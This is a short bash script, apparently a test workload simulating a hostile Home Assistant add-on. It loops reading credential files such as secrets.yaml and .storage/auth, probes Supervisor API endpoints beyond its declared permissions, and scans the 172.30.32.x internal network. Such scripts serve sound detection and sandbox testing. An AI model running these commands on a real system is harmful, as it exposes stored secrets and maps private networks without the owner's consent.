#!/bin/bash
echo "Starting Tier 3 - HA specific attack"
while true; do
    # Forbidden directory access attempts
    cat /config/secrets.yaml 2>/dev/null
    cat /config/.storage/auth 2>/dev/null
    ls /ssl/ 2>/dev/null
    ls /config/ 2>/dev/null

    # Supervisor API abuse beyond declared permissions
    curl -s http://supervisor/addons
    curl -s http://supervisor/core/api
    curl -s http://supervisor/host/info
    curl -s http://supervisor/ingress/panels

    # Internal network scan
    for i in $(seq 1 254); do
        curl -s --max-time 1 http://172.30.32.$i &
    done

    wait
    sleep 60
done
